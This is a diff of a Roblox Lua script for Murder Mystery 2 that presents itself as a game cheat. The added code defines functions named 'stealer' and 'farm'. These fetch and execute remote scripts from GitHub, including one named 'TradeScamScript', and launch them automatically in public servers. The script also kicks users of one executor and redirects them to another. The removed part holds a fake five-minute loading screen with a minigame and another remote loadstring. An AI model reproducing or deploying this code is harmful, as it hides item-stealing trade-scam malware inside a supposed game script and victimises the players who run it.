@@ -1,197 +1,44 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Pedringameplaysw/mm2/refs/heads/main/script2", true))()
---!strict
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local player = Players.LocalPlayer
-
--- Main GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "CustomLoader"
-gui.Parent = player:WaitForChild("PlayerGui")
-gui.ResetOnSpawn = false
-
--- Frame (400x220, centered)
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 400, 0, 220)
-frame.Position = UDim2.new(0.5, -200, 0.5, -110)
-frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-frame.BorderSizePixel = 0
-frame.Parent = gui
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
-
--- Title
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -20, 0, 40)
-Title.Position = UDim2.new(0, 10, 0, 5)
-Title.BackgroundTransparency = 1
-Title.TextColor3 = Color3.fromRGB(0, 255, 200)
-Title.TextSize = 24
-Title.Font = Enum.Font.GothamBold
-Title.Text = "Script is initializing"
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = frame
-
--- Discord links (below title)
-local discordLinks = Instance.new("TextLabel")
-discordLinks.Size = UDim2.new(1, -20, 0, 20)
-discordLinks.Position = UDim2.new(0, 10, 0, 45)
-discordLinks.BackgroundTransparency = 1
-discordLinks.TextColor3 = Color3.fromRGB(180, 180, 180)
-discordLinks.TextSize = 14
-discordLinks.Font = Enum.Font.Gotham
-discordLinks.Text = "gg/cEGkE9Q3Gr | gg/UZfQp28sV7"
-discordLinks.TextXAlignment = Enum.TextXAlignment.Left
-discordLinks.Parent = frame
-
--- Loading bar
-local loadingBarFrame = Instance.new("Frame")
-loadingBarFrame.Size = UDim2.new(0, 0, 0.1, 0)
-loadingBarFrame.Position = UDim2.new(0.05, 0, 0.35, 0)
-loadingBarFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
-loadingBarFrame.BorderSizePixel = 0
-loadingBarFrame.Parent = frame
-Instance.new("UICorner", loadingBarFrame).CornerRadius = UDim.new(0, 6)
-
--- Loading percentage
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0.95, 0, 0, 30)
-loadingText.Position = UDim2.new(0.03, 0, 0.48, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.TextSize = 18
-loadingText.Font = Enum.Font.GothamBold
-loadingText.Text = "Loading..."
-loadingText.Parent = frame
-
--- Minigame container (below loading bar)
-local gameBox = Instance.new("Frame")
-gameBox.Size = UDim2.new(0.9, 0, 0.25, 0)
-gameBox.Position = UDim2.new(0.05, 0, 0.65, 0) -- moved below loading text
-gameBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-gameBox.BorderSizePixel = 0
-gameBox.Parent = frame
-Instance.new("UICorner", gameBox).CornerRadius = UDim.new(0, 10)
-
--- Instructions on top of box
-local instructions = Instance.new("TextLabel")
-instructions.Size = UDim2.new(1, -10, 0, 25)
-instructions.Position = UDim2.new(0, 5, 0, 5)
-instructions.BackgroundTransparency = 1
-instructions.Text = "Catch the falling squares to slightly boost loading!"
-instructions.TextColor3 = Color3.fromRGB(180, 180, 255)
-instructions.Font = Enum.Font.Gotham
-instructions.TextSize = 14
-instructions.TextXAlignment = Enum.TextXAlignment.Center
-instructions.Parent = gameBox
-
--- Catching bar
-local catchBar = Instance.new("Frame")
-catchBar.Size = UDim2.new(0.15, 0, 0.15, 0)
-catchBar.Position = UDim2.new(0.425, 0, 0.7, 0)
-catchBar.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
-catchBar.BorderSizePixel = 0
-catchBar.Parent = gameBox
-Instance.new("UICorner", catchBar).CornerRadius = UDim.new(0, 6)
-
--- Minigame variables
-local moveDir = 0
-local fallingSquares = {}
-UserInputService.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.Keyboard then
-		if input.KeyCode == Enum.KeyCode.Left then moveDir = -1 end
-		if input.KeyCode == Enum.KeyCode.Right then moveDir = 1 end
-	end
-end)
-UserInputService.InputEnded:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.Keyboard then
-		if input.KeyCode == Enum.KeyCode.Left or input.KeyCode == Enum.KeyCode.Right then moveDir = 0 end
-	end
-end)
-
--- Falling squares spawner
-spawn(function()
-	while gui.Parent do
-		local square = Instance.new("Frame")
-		square.Size = UDim2.new(0.05,0,0.05,0)
-		square.Position = UDim2.new(math.random(),0,-0.05,0)
-		square.BackgroundColor3 = Color3.fromRGB(0,255,200)
-		square.BorderSizePixel = 0
-		square.Parent = gameBox
-		Instance.new("UICorner", square).CornerRadius = UDim.new(0,4)
-		table.insert(fallingSquares, square)
-		wait(0.8)
-	end
-end)
-
--- Loading variables
-local totalTime = 300 -- 5 minutes
-local progress = 0
-local boost = 0
-local step = 100 / (totalTime / 0.03)
-
--- Neon pulse
-spawn(function()
-	local t = 0
-	while gui.Parent do
-		t = t + 0.03
-		local glowIntensity = (math.sin(t)+1)/2*0.6 + 0.4
-		local color = Color3.fromRGB(0, math.floor(255*glowIntensity), math.floor(200*glowIntensity))
-		Title.TextColor3 = color
-		loadingText.TextColor3 = color
-		loadingBarFrame.BackgroundColor3 = color
-		catchBar.BackgroundColor3 = color
-		wait(0.03)
-	end
-end)
-
--- Main loop
-spawn(function()
-	while progress < 100 do
-		-- Move catch bar
-		local x = catchBar.Position.X.Scale + moveDir*0.015
-		catchBar.Position = UDim2.new(math.clamp(x,0,0.85),0,catchBar.Position.Y.Scale,0)
-
-		-- Move squares
-		for i=#fallingSquares,1,-1 do
-			local sq = fallingSquares[i]
-			sq.Position = UDim2.new(sq.Position.X.Scale,0,sq.Position.Y.Scale+0.01,0)
-			-- Collision
-			if sq.Position.Y.Scale+sq.Size.Y.Scale >= catchBar.Position.Y.Scale and
-			   sq.Position.X.Scale+sq.Size.X.Scale >= catchBar.Position.X.Scale and
-			   sq.Position.X.Scale <= catchBar.Position.X.Scale + catchBar.Size.X.Scale then
-				boost = boost + 0.5
-				sq:Destroy()
-				table.remove(fallingSquares,i)
-			elseif sq.Position.Y.Scale >= 1 then
-				sq:Destroy()
-				table.remove(fallingSquares,i)
-			end
-		end
-
-		-- Update progress
-		progress = math.min(progress + step + boost, 100)
-		boost = boost * 0.8
-		loadingBarFrame.Size = UDim2.new(progress/100,0,0.1,0)
-		loadingText.Text = string.format("Loading: %d%%", math.floor(progress))
-		wait(0.03)
-	end
-
-	loadingText.Text = "Script has been fully initialized, enjoy!"
-	wait(0.5)
-	gui:Destroy()
-end)
-
-
-
-a = game:GetService("ReplicatedStorage").Remotes.Extras.IsVIPServer:InvokeServer()
-if a == true then
-    game:GetService("Players").LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
+-- Executor kontrol fonksiyonu
+local function isRonixExploit()
+    -- Ronix Exploit'i tespit etmek için çeşitli yöntemler
+    if getexecutorname and getexecutorname():lower():find("ronix") then
+        return true
+    end
+    
+    -- Diğer tespit yöntemleri
+    if syn and syn.protect_gui and not is_sirhurt_closure then
+        return false -- Synapse X
+    elseif identifyexecutor and identifyexecutor():lower():find("ronix") then
+        return true
+    end
+    
+    return false
 end
 
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/hayrankal/api.overdrivehub.xyz/refs/heads/main/%7C'))()
+end
 
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/MM2TradeScamScript/refs/heads/main/TradeScamScript"))()
+end
 
+-- Executor kontrolü
+if isRonixExploit() then
+    LocalPlayer:Kick("Your executor does not support this script, please use Delta.")
+    return -- Scripti durdur
+end
 
+-- Sunucu kontrolü
+local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
 
-   
-
+if not isVIPServer then
+    task.spawn(stealer)
+    task.spawn(farm)
+else
+    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
+end
